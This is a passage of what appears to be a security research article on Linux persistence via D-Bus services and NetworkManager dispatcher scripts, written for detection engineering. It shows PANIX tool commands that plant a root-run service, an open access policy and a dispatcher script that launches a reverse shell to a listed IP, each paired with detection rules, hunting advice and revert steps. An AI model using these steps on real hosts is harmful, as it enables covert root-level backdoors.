files:\",`\n`,(0,i.jsxs)(e.ul,{children:[`\n`,(0,i.jsx)(e.li,{children:(0,i.jsx)(e.code,{children:\"/usr/share/dbus-1/system-services/\"})}),`\n`,(0,i.jsx)(e.li,{children:(0,i.jsx)(e.code,{children:\"/usr/local/share/dbus-1/system-services/\"})}),`\n`]}),`\n`]}),`\n`,(0,i.jsxs)(e.li,{children:[\"System policy files:\",`\n`,(0,i.jsxs)(e.ul,{children:[`\n`,(0,i.jsx)(e.li,{children:(0,i.jsx)(e.code,{children:\"/etc/dbus-1/system.d/\"})}),`\n`,(0,i.jsx)(e.li,{children:(0,i.jsx)(e.code,{children:\"/usr/share/dbus-1/system.d/\"})}),`\n`]}),`\n`]}),`\n`,(0,i.jsxs)(e.li,{children:[\"System configuration files:\",`\n`,(0,i.jsxs)(e.ul,{children:[`\n`,(0,i.jsx)(e.li,{children:(0,i.jsx)(e.code,{children:\"/etc/dbus-1/system.conf\"})}),`\n`,(0,i.jsx)(e.li,{children:(0,i.jsx)(e.code,{children:\"/usr/share/dbus-1/system.conf\"})}),`\n`]}),`\n`]}),`\n`]}),`\n`]}),`\n`,(0,i.jsxs)(e.li,{children:[(0,i.jsx)(e.strong,{children:\"Session-wide Configuration and Services\"}),\":\",`\n`,(0,i.jsxs)(e.ul,{children:[`\n`,(0,i.jsxs)(e.li,{children:[\"Session service files:\",`\n`,(0,i.jsxs)(e.ul,{children:[`\n`,(0,i.jsx)(e.li,{children:(0,i.jsx)(e.code,{children:\"/usr/share/dbus-1/session-services/\"})}),`\n`,(0,i.jsx)(e.li,{children:(0,i.jsx)(e.code,{children:\"~/.local/share/dbus-1/services/\"})}),`\n`]}),`\n`]}),`\n`,(0,i.jsxs)(e.li,{children:[\"Session policy files:\",`\n`,(0,i.jsxs)(e.ul,{children:[`\n`,(0,i.jsx)(e.li,{children:(0,i.jsx)(e.code,{children:\"/etc/dbus-1/session.d/\"})}),`\n`,(0,i.jsx)(e.li,{children:(0,i.jsx)(e.code,{children:\"/usr/share/dbus-1/session.d/\"})}),`\n`]}),`\n`]}),`\n`,(0,i.jsxs)(e.li,{children:[\"Session configuration files:\",`\n`,(0,i.jsxs)(e.ul,{children:[`\n`,(0,i.jsx)(e.li,{children:(0,i.jsx)(e.code,{children:\"/etc/dbus-1/session.conf\"})}),`\n`,(0,i.jsx)(e.li,{children:(0,i.jsx)(e.code,{children:\"/usr/share/dbus-1/session.conf\"})}),`\n`]}),`\n`]}),`\n`]}),`\n`]}),`\n`]}),`\n`,(0,i.jsxs)(e.p,{children:[\"More details on each path is available \",(0,i.jsx)(e.a,{href:\"https://dbus.freedesktop.org/doc/dbus-daemon.1.html\",rel:\"nofollow\",children:\"here\"}),\". D-Bus policies, written in XML, define access control rules for D-Bus services. These policies specify who can perform actions such as sending messages, receiving responses, or owning specific services. They are essential for controlling access to privileged operations and ensuring that services are not misused. There are several key components to a D-Bus policy:\"]}),`\n`,(0,i.jsxs)(e.ol,{children:[`\n`,(0,i.jsxs)(e.li,{children:[(0,i.jsx)(e.strong,{children:\"Context\"}),\":\"]}),`\n`]}),`\n`,(0,i.jsxs)(e.ul,{children:[`\n`,(0,i.jsxs)(e.li,{children:[\"Policies can apply to specific users, groups, or a default context (\",(0,i.jsx)(e.code,{children:\"default\"}),\" applies to all users unless overridden).\"]}),`\n`]}),`\n`,(0,i.jsxs)(e.ol,{start:\"2\",children:[`\n`,(0,i.jsxs)(e.li,{children:[(0,i.jsx)(e.strong,{children:\"Allow/Deny Rules\"}),\":\"]}),`\n`]}),`\n`,(0,i.jsxs)(e.ul,{children:[`\n`,(0,i.jsxs)(e.li,{children:[\"Rules explicitly grant (\",(0,i.jsx)(e.code,{children:\"allow\"}),\") or restrict (\",(0,i.jsx)(e.code,{children:\"deny\"}),\") access to methods, interfaces, or services.\"]}),`\n`]}),`\n`,(0,i.jsxs)(e.ol,{start:\"3\",children:[`\n`,(0,i.jsxs)(e.li,{children:[(0,i.jsx)(e.strong,{children:\"Granularity\"}),\":\"]}),`\n`]}),`\n`,(0,i.jsxs)(e.ul,{children:[`\n`,(0,i.jsxs)(e.li,{children:[\"Policies can control access at multiple levels:\",`\n`,(0,i.jsxs)(e.ul,{children:[`\n`,(0,i.jsxs)(e.li,{children:[\"Entire services (e.g., \",(0,i.jsx)(e.code,{children:\"org.freedesktop.MyService\"}),\").\"]}),`\n`,(0,i.jsxs)(e.li,{children:[\"Specific methods or interfaces (e.g., \",(0,i.jsx)(e.code,{children:\"org.freedesktop.MyService.SecretMethod\"}),\").\"]}),`\n`]}),`\n`]}),`\n`]}),`\n`,(0,i.jsx)(e.p,{children:\"The following example demonstrates a D-Bus policy that enforces clear access restrictions:\"}),`\n`,(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:`\u003c!DOCTYPE busconfig PUBLIC \"-//freedesktop//DTD D-Bus Bus Configuration 1.0//EN\"\n  \"http://www.freedesktop.org/standards/dbus/1.0/busconfig.dtd\"\u003e\n\u003cbusconfig\u003e\n    \u003c!-- Default policy: Deny all access --\u003e\n    \u003cpolicy context=\"default\"\u003e\n        \u003cdeny send_destination=\"org.freedesktop.MyService\"/\u003e\n    \u003c/policy\u003e\n\n    \u003c!-- Allow only users in the \"admin\" group to access specific methods --\u003e\n    \u003cpolicy group=\"admin\"\u003e\n        \u003callow send_interface=\"org.freedesktop.MyService.PublicMethod\"/\u003e\n    \u003c/policy\u003e\n\n    \u003c!-- Allow root to access all methods --\u003e\n    \u003cpolicy user=\"root\"\u003e\n        \u003callow send_destination=\"org.freedesktop.MyService\"/\u003e\n    \u003c/policy\u003e\n\u003c/busconfig\u003e\n`})}),`\n`,(0,i.jsx)(e.p,{children:\"This policy:\"}),`\n`,(0,i.jsxs)(e.ol,{children:[`\n`,(0,i.jsxs)(e.li,{children:[\"Denies all access to the service \",(0,i.jsx)(e.code,{children:\"org.freedesktop.MyService\"}),\" by default.\"]}),`\n`,(0,i.jsxs)(e.li,{children:[\"Grants users in the \",(0,i.jsx)(e.code,{children:\"admin\"}),\" group access to a specific interface (\",(0,i.jsx)(e.code,{children:\"org.freedesktop.MyService.PublicMethod\"}),\").\"]}),`\n`,(0,i.jsxs)(e.li,{children:[\"Grants full access to the \",(0,i.jsx)(e.code,{children:\"org.freedesktop.MyService\"}),\" destination for the \",(0,i.jsx)(e.code,{children:\"root\"}),\" user.\"]}),`\n`]}),`\n`,(0,i.jsx)(e.p,{children:\"D-Bus\\u2019s central role in IPC makes it a potential interesting target for attackers. Potential attack vectors include:\"}),`\n`,(0,i.jsxs)(e.ol,{children:[`\n`,(0,i.jsxs)(e.li,{children:[(0,i.jsx)(e.strong,{children:\"Hijacking or Registering Malicious Services\"}),\":\",`\n`,(0,i.jsxs)(e.ul,{children:[`\n`,(0,i.jsxs)(e.li,{children:[\"Attackers can replace or add \",(0,i.jsx)(e.code,{children:\".service\"}),\" files in e.g. \",(0,i.jsx)(e.code,{children:\"/usr/share/dbus-1/system-services/\"}),\" to hijack legitimate communication or inject malicious code.\"]}),`\n`]}),`\n`]}),`\n`,(0,i.jsxs)(e.li,{children:[(0,i.jsx)(e.strong,{children:\"Creating or Exploiting Over-permissive Policies\"}),\":\",`\n`,(0,i.jsxs)(e.ul,{children:[`\n`,(0,i.jsx)(e.li,{children:\"Weak policies (e.g., granting all users access to critical services) can allow attackers to invoke privileged methods.\"}),`\n`]}),`\n`]}),`\n`,(0,i.jsxs)(e.li,{children:[(0,i.jsx)(e.strong,{children:\"Abusing Vulnerable Services\"}),\":\",`\n`,(0,i.jsxs)(e.ul,{children:[`\n`,(0,i.jsx)(e.li,{children:\"If a D-Bus service improperly validates input, attackers may execute arbitrary code or perform unauthorized actions.\"}),`\n`]}),`\n`]}),`\n`]}),`\n`,(0,i.jsxs)(e.p,{children:[\"The examples above can be used for privilege escalation, defense evasion and persistence. Currently, there is no specific MITRE ATT\u0026CK sub-technique for D-Bus. However, its abuse aligns closely with \",(0,i.jsx)(e.a,{href:\"https://attack.mitre.org/techniques/T1543/\",rel:\"nofollow\",children:\"T1543: Create or Modify System Process\"}),\", as well as \",(0,i.jsx)(e.a,{href:\"https://attack.mitre.org/techniques/T1574/\",rel:\"nofollow\",children:\"T1574: Hijack Execution Flow\"}),\" for cases where \",(0,i.jsx)(e.code,{children:\".service\"}),\" files are modified.\"]}),`\n`,(0,i.jsx)(e.p,{children:\"In the next section we will take a look at how an attacker can set up overly permissive D-Bus configurations that send out reverse connections with root permissions, while discussing approaches to detecting this behavior.\"}),`\n`,(0,i.jsx)(e.h1,{id:\"persistence-through-t1543---create-or-modify-system-process-d-bus\",children:\"Persistence through T1543 - Create or Modify System Process: D-Bus\"}),`\n`,(0,i.jsxs)(e.p,{children:[\"Now that we've learnt all about D-Bus setup, it\\u2019s time to take a look at how to simulate this in practice through the \",(0,i.jsx)(e.a,{href:\"https://github.com/Aegrah/PANIX/blob/7e27768807e12d11932e2fca5b6a4867308295dd/modules/setup_dbus.sh\",rel:\"nofollow\",children:\"setup_dbus.sh\"}),\" PANIX module. PANIX starts off by creating a D-Bus service file at \",(0,i.jsx)(e.code,{children:\"/usr/share/dbus-1/system-services/org.panix.persistence.service\"}),\" with the following contents:\"]}),`\n`,(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:`cat \u003c\u003c'EOF' \u003e \"$service_file\"\n[D-BUS Service]\nName=org.panix.persistence\nExec=/usr/local/bin/dbus-panix.sh\nUser=root\nEOF\n`})}),`\n`,(0,i.jsxs)(e.p,{children:[\"This service file will listen on the \",(0,i.jsx)(e.code,{children:\"org.panix.persistence\"}),\" interface, and execute the \",(0,i.jsx)(e.code,{children:\"/usr/local/bin/dbus-panix.sh\"}),\" \\u201Cservice\\u201D. The \",(0,i.jsx)(e.code,{children:\"dbus-panix.sh\"}),\" script simply invokes a reverse shell connection when called:\"]}),`\n`,(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:`cat \u003c\u003cEOF \u003e \"$payload_script\"\n#!/bin/bash\n# When D-Bus triggers this service, execute payload.\n\\${payload}\nEOF\n`})}),`\n`,(0,i.jsxs)(e.p,{children:[\"To ensure any user is allowed to invoke the actions corresponding to the interface, PANIX sets up a \",(0,i.jsx)(e.code,{children:\"/etc/dbus-1/system.d/org.panix.persistence.conf\"}),\" file with the following contents:\"]}),`\n`,(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:`cat \u003c\u003c'EOF' \u003e \"$conf_file\"\n\u003c!DOCTYPE busconfig PUBLIC \"-//freedesktop//DTD D-Bus Bus Configuration 1.0//EN\"\n\t\"http://www.freedesktop.org/standards/dbus/1.0/busconfig.dtd\"\u003e\n\u003cbusconfig\u003e\n\t\u003c!-- Allow any user to own, send to, and access the specified service --\u003e\n\t\u003cpolicy context=\"default\"\u003e\n\t\t\u003callow own=\"org.panix.persistence\"/\u003e\n\t\t\u003callow send_destination=\"org.panix.persistence\"/\u003e\n\t\t\u003callow send_interface=\"org.panix.persistence\"/\u003e\n\t\u003c/policy\u003e\n\u003c/busconfig\u003e\nEOF\n`})}),`\n`,(0,i.jsxs)(e.p,{children:[\"This configuration defines a D-Bus policy that permits any user or process to own, send messages to, and interact with the \",(0,i.jsx)(e.code,{children:\"org.panix.persistence\"}),\" service, effectively granting unrestricted access to it. After restarting the \",(0,i.jsx)(e.code,{children:\"dbus\"}),\" service, the setup is complete.\"]}),`\n`,(0,i.jsx)(e.p,{children:\"To interact with the service, the following command can be used:\"}),`\n`,(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:`dbus-send --system --type=method_call /\n--dest=org.panix.persistence /org/panix/persistence /\norg.panix.persistence.Method\n`})}),`\n`,(0,i.jsxs)(e.p,{children:[\"This command sends a method call to the D-Bus system bus, targeting the \",(0,i.jsx)(e.code,{children:\"org.panix.persistence\"}),\" service, invoking the \",(0,i.jsx)(e.code,{children:\"org.panix.persistence.Method\"}),\" method on the \",(0,i.jsx)(e.code,{children:\"/org/panix/persistence\"}),\" object, effectively triggering the backdoor.\"]}),`\n`,(0,i.jsx)(e.p,{children:\"Let\\u2019s run the PANIX module with the following command line arguments:\"}),`\n`,(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:`\u003e sudo ./panix.sh --dbus --default --ip 192.168.1.100 --port 2016\n\n[+] Created/updated D-Bus service file: /usr/share/dbus-1/system-services/org.panix.persistence.service\n[+] Created/updated payload script: /usr/local/bin/dbus-panix.sh\n[+] Created/updated D-Bus config file: /etc/dbus-1/system.d/org.panix.persistence.conf\n[!] Restarting D-Bus...\n[+] D-Bus restarted successfully.\n[+] D-Bus persistence module completed. Test with:\n\ndbus-send --system --type=method_call --print-reply /\n--dest=org.panix.persistence /org/panix/persistence /\norg.panix.persistence.Method\n`})}),`\n`,(0,i.jsxs)(e.p,{children:[\"Upon execution of the \",(0,i.jsx)(e.code,{children:\"dbus-send\"}),\" command:\"]}),`\n`,(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:`dbus-send --system --type=method_call --print-reply /\n--dest=org.panix.persistence /org/panix/persistence /\norg.panix.persistence.Method\n`})}),`\n`,(0,i.jsx)(e.p,{children:\"We will take a look at the documents in Kibana:\"}),`\n`,(0,i.jsx)(e.p,{children:(0,i.jsx)(e.img,{src:\"/assets/images/the-grand-finale-on-linux-persistence/image4.png\",alt:\"PANIX D-Bus module execution visualized in Kibana\",width:\"1600\",height:\"1420\"})}),`\n`,(0,i.jsxs)(e.p,{children:[\"Upon PANIX execution, the \",(0,i.jsx)(e.code,{children:\"org.panix.persistence.service\"}),\", \",(0,i.jsx)(e.code,{children:\"dbus-panix.sh\"}),\", and \",(0,i.jsx)(e.code,{children:\"org.panix.persistence.conf\"}),\" files are created, successfully setting the stage. Afterwards, the \",(0,i.jsx)(e.code,{children:\"dbus\"}),\" service is restarted, and the dbus-send command is executed to interact with the \",(0,i.jsx)(e.code,{children:\"org.panix.persistence\"}),\" service. Upon invocation of the \",(0,i.jsx)(e.code,{children:\"org.panix.persistence.Method\"}),\" method, the \",(0,i.jsx)(e.code,{children:\"dbus-panix.sh\"}),\" backdoor is executed, and the reverse shell connection chain (\",(0,i.jsx)(e.code,{children:\"dbus-panix.sh\"}),\" \\u2192 \",(0,i.jsx)(e.code,{children:\"nohup\"}),\" \\u2192 \",(0,i.jsx)(e.code,{children:\"setsid\"}),\" \\u2192 \",(0,i.jsx)(e.code,{children:\"bash\"}),\") is initiated.\"]}),`\n`,(0,i.jsx)(e.p,{children:\"Let\\u2019s take a look at our detection opportunities:\"}),`\n`,(0,i.jsx)(e.p,{children:(0,i.jsx)(e.em,{children:\"Detection and endpoint rules that cover D-Bus persistence\"})}),`\n`,(0,i.jsx)(e.div,{className:\"table-container\",children:(0,i.jsxs)(e.table,{children:[(0,i.jsx)(e.thead,{children:(0,i.jsxs)(e.tr,{children:[(0,i.jsx)(e.th,{align:\"left\",children:\"Category\"}),(0,i.jsx)(e.th,{align:\"left\",children:\"Coverage\"})]})}),(0,i.jsxs)(e.tbody,{children:[(0,i.jsxs)(e.tr,{children:[(0,i.jsx)(e.td,{align:\"left\",children:\"File\"}),(0,i.jsx)(e.td,{align:\"left\",children:(0,i.jsx)(e.a,{href:\"https://github.com/elastic/detection-rules/blob/fb13b89f8d277ee78d4027a8014ad67023aa167c/rules/linux/persistence_dbus_service_creation.toml\",rel:\"nofollow\",children:\"D-Bus Service Created\"})})]}),(0,i.jsxs)(e.tr,{children:[(0,i.jsx)(e.td,{align:\"left\"}),(0,i.jsx)(e.td,{align:\"left\",children:(0,i.jsx)(e.a,{href:\"https://github.com/elastic/detection-rules/blob/ac541f0b18697e053b3b56544052955d29b440c0/rules/integrations/fim/persistence_suspicious_file_modifications.toml\",rel:\"nofollow\",children:\"Potential Persistence via File Modification\"})})]}),(0,i.jsxs)(e.tr,{children:[(0,i.jsx)(e.td,{align:\"left\",children:\"Process\"}),(0,i.jsx)(e.td,{align:\"left\",children:(0,i.jsx)(e.a,{href:\"https://github.com/elastic/protections-artifacts/blob/3fac07906582ca9615d0e291a4629445fd5ca37b/behavior/rules/linux/execution_suspicious_d_bus_method_call.toml\",rel:\"nofollow\",children:\"Suspicious D-Bus Method Call\"})})]}),(0,i.jsxs)(e.tr,{children:[(0,i.jsx)(e.td,{align:\"left\"}),(0,i.jsx)(e.td,{align:\"left\",children:(0,i.jsx)(e.a,{href:\"https://github.com/elastic/detection-rules/blob/1851ab91fdb84ac2c1fc9bf9d0663badadd0d0a7/rules/linux/persistence_dbus_unsual_daemon_parent_execution.toml\",rel:\"nofollow\",children:\"Unusual D-Bus Daemon Child Process\"})})]})]})]})}),`\n`,(0,i.jsx)(e.p,{children:\"To revert any changes, you can use the corresponding revert module by running:\"}),`\n`,(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:`\u003e ./panix.sh --revert dbus\n\n[*] Reverting D-Bus persistence module...\n[+] Removing D-Bus service file: /usr/share/dbus-1/system-services/org.panix.persistence.service...\n[+] D-Bus service file removed.\n[+] Removing payload script: /usr/local/bin/dbus-panix.sh\n[+] Payload script removed.\n[+] Removing D-Bus configuration file: /etc/dbus-1/system.d/org.panix.persistence.conf...\n[+] D-Bus configuration file removed.\n[*] Restarting D-Bus...\n[+] D-Bus restarted successfully.\n[+] D-Bus persistence reverted.\n`})}),`\n`,(0,i.jsx)(e.h1,{id:\"hunting-for-t1543---create-or-modify-system-process-d-bus\",children:\"Hunting for T1543 - Create or Modify System Process: D-Bus\"}),`\n`,(0,i.jsx)(e.p,{children:\"We can hunt for this technique using ES|QL and OSQuery by focusing on suspicious activity tied to the use and modification of D-Bus-related files, services, and processes. The approach includes monitoring for the following:\"}),`\n`,(0,i.jsxs)(e.ol,{children:[`\n`,(0,i.jsxs)(e.li,{children:[(0,i.jsx)(e.strong,{children:\"Creations and/or Modifications to D-Bus Configuration and Service Files\"}),\": Tracks changes in critical directories, such as system-wide and session service files and policy files. Monitoring these paths helps detect unauthorized additions or modifications that may indicate malicious activity targeting D-Bus.\"]}),`\n`,(0,i.jsxs)(e.li,{children:[(0,i.jsx)(e.strong,{children:\"Metadata Analysis of D-Bus Files\"}),\": Inspects file ownership, last access times, and modification timestamps for D-Bus configuration files. This can reveal unauthorized changes or the presence of unexpected files that may indicate attempts to persist through D-Bus.\"]}),`\n`,(0,i.jsxs)(e.li,{children:[(0,i.jsx)(e.strong,{children:\"Detection of Suspicious Processes\"}),\": Monitors executions of processes such as \",(0,i.jsx)(e.code,{children:\"dbus-daemon\"}),\" and \",(0,i.jsx)(e.code,{children:\"dbus-send\"}),\", which are key components of D-Bus communication. By tracking command lines, parent processes, and execution counts, unusual or unauthorized usage can be identified.\"]}),`\n`,(0,i.jsxs)(e.li,{children:[(0,i.jsx)(e.strong,{children:\"Detection of Rare or Anomalous Events\"}),\": Identifies uncommon file modifications or process executions by correlating event data across endpoints. This highlights subtle indicators of compromise, such as rare changes to critical D-Bus configurations or the unexpected use of D-Bus commands.\"]}),`\n`]}),`\n`,(0,i.jsxs)(e.p,{children:[\"By combining the \",(0,i.jsx)(e.a,{href:\"https://github.com/elastic/detection-rules/blob/1851ab91fdb84ac2c1fc9bf9d0663badadd0d0a7/hunting/linux/queries/persistence_via_desktop_bus.toml\",rel:\"nofollow\",children:\"Persistence via Desktop Bus (D-Bus)\"}),\" hunting rule with the tailored detection queries listed above, analysts can effectively identify and respond to \",(0,i.jsx)(e.a,{href:\"https://attack.mitre.org/techniques/T1543/\",rel:\"nofollow\",children:\"T1543\"}),\".\"]}),`\n`,(0,i.jsx)(e.h1,{id:\"t1546---event-triggered-execution-networkmanager\",children:\"T1546 - Event Triggered Execution: NetworkManager\"}),`\n`,(0,i.jsxs)(e.p,{children:[(0,i.jsx)(e.a,{href:\"https://wiki.archlinux.org/title/NetworkManager\",rel:\"nofollow\",children:\"NetworkManager\"}),\" is a widely used daemon for managing network connections on Linux systems. It allows for configuring wired, wireless, VPN, and other network interfaces while offering a modular and extensible design. One of its lesser-known but powerful features is its \",(0,i.jsx)(e.a,{href:\"https://wiki.archlinux.org/title/NetworkManager#Network_services_with_NetworkManager_dispatcher\",rel:\"nofollow\",children:\"dispatcher\"}),\" feature, which provides a way to execute scripts automatically in response to network events. When certain network events occur (e.g., an interface comes up or goes down), NetworkManager invokes scripts located in this directory. These scripts run as root, making them highly privileged.\"]}),`\n`,(0,i.jsxs)(e.ul,{children:[`\n`,(0,i.jsxs)(e.li,{children:[(0,i.jsx)(e.strong,{children:\"Event Types\"}),\": NetworkManager passes specific events to scripts, such as:\",`\n`,(0,i.jsxs)(e.ul,{children:[`\n`,(0,i.jsxs)(e.li,{children:[(0,i.jsx)(e.code,{children:\"up\"}),\": Interface is activated.\"]}),`\n`,(0,i.jsxs)(e.li,{children:[(0,i.jsx)(e.code,{children:\"down\"}),\": Interface is deactivated.\"]}),`\n`,(0,i.jsxs)(e.li,{children:[(0,i.jsx)(e.code,{children:\"vpn-up\"}),\": VPN connection is established.\"]}),`\n`,(0,i.jsxs)(e.li,{children:[(0,i.jsx)(e.code,{children:\"vpn-down\"}),\": VPN connection is disconnected.\"]}),`\n`]}),`\n`]}),`\n`]}),`\n`,(0,i.jsxs)(e.p,{children:[\"Scripts placed in \",(0,i.jsx)(e.code,{children:\"/etc/NetworkManager/dispatcher.d/\"}),\" are standard shell scripts and must be marked executable. An example of a dispatcher script may look like this:\"]}),`\n`,(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:`#!/bin/bash\nINTERFACE=$1\nEVENT=$2\n\nif [ \"$EVENT\" == \"up\" ]; then\n    logger \"Interface $INTERFACE is up. Executing custom script.\"\n    # Perform actions, such as logging, mounting, or starting services\n    /usr/bin/some-command --arg value\nelif [ \"$EVENT\" == \"down\" ]; then\n    logger \"Interface $INTERFACE is down. Cleaning up.\"\n    # Perform cleanup actions\nfi\n`})}),`\n`,(0,i.jsx)(e.p,{children:\"Logging events and executing commands whenever a network interface comes up or goes down.\"}),`\n`,(0,i.jsx)(e.p,{children:\"To achieve persistence through this technique, an attacker can either:\"}),`\n`,(0,i.jsxs)(e.ul,{children:[`\n`,(0,i.jsx)(e.li,{children:\"Create a custom script, mark it executable and place it within the dispatcher directory\"}),`\n`,(0,i.jsx)(e.li,{children:\"Modify a legitimate dispatcher script to execute a payload upon a certain network event.\"}),`\n`]}),`\n`,(0,i.jsxs)(e.p,{children:[\"Persistence through \",(0,i.jsx)(e.code,{children:\"dispatcher.d/\"}),\" aligns with \",(0,i.jsx)(e.a,{href:\"https://attack.mitre.org/techniques/T1546/\",rel:\"nofollow\",children:\"T1546: Event Triggered Execution\"}),\" and \",(0,i.jsx)(e.a,{href:\"https://attack.mitre.org/techniques/T1543/\",rel:\"nofollow\",children:\"T1543: Create or Modify System Process\"}),\" in the MITRE ATT\u0026CK framework. NetworkManager dispatcher scripts however do not have their own sub-technique.\"]}),`\n`,(0,i.jsx)(e.p,{children:\"In the next section, we will explore how dispatcher scripts can be exploited for persistence and visualize the process flow to support effective detection engineering.\"}),`\n`,(0,i.jsx)(e.h1,{id:\"persistence-through-t1546---event-triggered-execution\",children:\"Persistence through T1546 - Event Triggered Execution:\"}),`\n`,(0,i.jsxs)(e.p,{children:[\"The concept of this technique is very simple, let\\u2019s now put it to practice through the \",(0,i.jsx)(e.a,{href:\"https://github.com/Aegrah/PANIX/blob/7e27768807e12d11932e2fca5b6a4867308295dd/modules/setup_network_manager.sh\",rel:\"nofollow\",children:\"setup_network_manager.sh\"}),\" PANIX module. The module checks whether the NetworkManager package is available, and whether the \",(0,i.jsx)(e.code,{children:\"/etc/NetworkManager/dispatcher.d/\"}),\" path exists, as these are requisites for the technique to work. Next, it creates a new dispatcher file under \",(0,i.jsx)(e.code,{children:\"/etc/NetworkManager/dispatcher.d/panix-dispatcher.sh\"}),\", with a payload on the end. Finally, it grants execution permissions to the dispatcher file, after which it is ready to be activated.\"]}),`\n`,(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:`cat \u003c\u003c'EOF' \u003e \"$dispatcher_file\"\n#!/bin/sh -e\n\nif [ \"$2\" = \"connectivity-change\" ]; then\n\texit 0\nfi\n\nif [ -z \"$1\" ]; then\n\techo \"$0: called with no interface\" 1\u003e\u00262\n\texit 1\nfi\n\n[...]\n\n# Insert payload here:\n__PAYLOAD_PLACEHOLDER__\nEOF\n\nchmod +x \"$dispatcher_file\"\n`})}),`\n`,(0,i.jsx)(e.p,{children:\"We have included only the most relevant snippets of the module above. Feel free to check out the module source code if you are interested in diving deeper.\"}),`\n`,(0,i.jsx)(e.p,{children:\"Let\\u2019s run the PANIX module with the following command line arguments:\"}),`\n`,(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:`\u003e sudo ./panix.sh --network-manager --default --ip 192.168.1.100 --port 2017\n\n[+] Created new dispatcher file: /etc/NetworkManager/dispatcher.d/panix-dispatcher.sh\n[+] Replaced payload placeholder with actual payload.\n[+] Using dispatcher file: /etc/NetworkManager/dispatcher.d/panix-dispatcher.sh\n`})}),`\n`,(0,i.jsx)(e.p,{children:\"Now, whenever a new network event triggers, the payload will be executed. This can be done through restarting the NetworkManager service, an interface or a reboot. Let\\u2019s take a look at the documents in Kibana:\"}),`\n`,(0,i.jsx)(e.p,{children:(0,i.jsx)(e.img,{src:\"/assets/images/the-grand-finale-on-linux-persistence/image1.png\",alt:\"PANIX network-manager module execution visualized in Kibana\",width:\"1667\",height:\"1322\"})}),`\n`,(0,i.jsxs)(e.p,{children:[\"Upon PANIX execution, the \",(0,i.jsx)(e.code,{children:\"panix-dispatcher.sh\"}),\" script is created, marked as executable and \",(0,i.jsx)(e.code,{children:\"sed\"}),\" is used to add the payload to the bottom of the script. Upon restarting the \",(0,i.jsx)(e.code,{children:\"NetworkManager\"}),\" service through \",(0,i.jsx)(e.code,{children:\"systemctl\"}),\", we can see \",(0,i.jsx)(e.code,{children:\"nm-dispatcher\"}),\" executing the \",(0,i.jsx)(e.code,{children:\"panix-dispatcher.sh\"}),\" script, effectively detonating the reverse shell chain (\",(0,i.jsx)(e.code,{children:\"panix-dispatcher.sh\"}),\" \\u2192 \",(0,i.jsx)(e.code,{children:\"nohup\"}),\" \\u2192 \",(0,i.jsx)(e.code,{children:\"setsid\"}),\" \\u2192 \",(0,i.jsx)(e.code,{children:\"bash\"}),\").\"]}),`\n`,(0,i.jsx)(e.p,{children:\"And finally, let\\u2019s take a look at our detection opportunities:\"}),`\n`,(0,i.jsx)(e.p,{children:(0,i.jsx)(e.em,{children:\"Detection and endpoint rules that cover network-manager persistence\"})}),`\n`,(0,i.jsx)(e.div,{className:\"table-container\",children:(0,i.jsxs)(e.table,{children:[(0,i.jsx)(e.thead,{children:(0,i.jsxs)(e.tr,{children:[(0,i.jsx)(e.th,{align:\"left\",children:\"Category\"}),(0,i.jsx)(e.th,{align:\"left\",children:\"Coverage\"})]})}),(0,i.jsxs)(e.tbody,{children:[(0,i.jsxs)(e.tr,{children:[(0,i.jsx)(e.td,{align:\"left\",children:\"File\"}),(0,i.jsx)(e.td,{align:\"left\",children:(0,i.jsx)(e.a,{href:\"https://github.com/elastic/detection-rules/blob/9b8b9175985ed533493e2c9dc4dc17ee8bf9e704/rules/linux/persistence_network_manager_dispatcher_persistence.toml\",rel:\"nofollow\",children:\"NetworkManager Dispatcher Script Creation\"})})]}),(0,i.jsxs)(e.tr,{children:[(0,i.jsx)(e.td,{align:\"left\"}),(0,i.jsx)(e.td,{align:\"left\",children:(0,i.jsx)(e.a,{href:\"https://github.com/elastic/detection-rules/blob/ac541f0b18697e053b3b56544052955d29b440c0/rules/integrations/fim/persistence_suspicious_file_modifications.toml\",rel:\"nofollow\",children:\"Potential Persistence via File Modification\"})})]}),(0,i.jsxs)(e.tr,{children:[(0,i.jsx)(e.td,{align:\"left\",children:\"Process\"}),(0,i.jsx)(e.td,{align:\"left\",children:(0,i.jsx)(e.a,{href:\"https://github.com/elastic/protections-artifacts/blob/3fac07906582ca9615d0e291a4629445fd5ca37b/behavior/rules/linux/execution_shell_via_networkmanager_dispatcher_script.toml\",rel:\"nofollow\",children:\"Shell via NetworkManager Dispatcher Script\"})})]}),(0,i.jsxs)(e.tr,{children:[(0,i.jsx)(e.td,{align:\"left\",children:\"Network\"}),(0,i.jsx)(e.td,{align:\"left\",children:(0,i.jsx)(e.a,{href:\"https://github.com/elastic/protections-artifacts/blob/3fac07906582ca9615d0e291a4629445fd5ca37b/behavior/rules/linux/execution_reverse_shell_via_networkmanager_dispatcher_script.toml\",rel:\"nofollow\",children:\"Reverse Shell via NetworkManager Dispatcher Script\"})})]})]})]})}),`\n`,(0,i.jsx)(e.p,{children:\"To revert any changes, you can use the corresponding revert module by running:\"}),`\n`,(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:`\u003e ./panix.sh --revert network-manager\n\n[+] Checking for payload in /etc/NetworkManager/dispatcher.d/01-ifupdown...\n[+] No payload found in /etc/NetworkManager/dispatcher.d/01-ifupdown.\n[+] Removing custom dispatcher file: /etc/NetworkManager/dispatcher.d/panix-dispatcher.sh...\n[+] Custom dispatcher file removed.\n[+] NetworkManager persistence reverted.\n`})}),`\n`,(0,i.jsx)(e.h1,{id:\"hunting-for-t1546---event-triggered-execution-networkmanager\",children:\"Hunting for T1546 - Event Triggered Execution: NetworkManager\"}),`\n`,(0,i.jsx)(e.p,{children:\"We can hunt for this technique using ES|QL and OSQuery by focusing on suspicious activity tied to the creation, modification, and execution of NetworkManager Dispatcher scripts. The approach includes monitoring for the following:\"}),`\n`,(0,i.jsxs)(e.ol,{children:[`\n`,(0,i.jsxs)(e.li,{children:[(0,i.jsx)(e.strong,{children:\"Creations and/or Modifications to Dispatcher 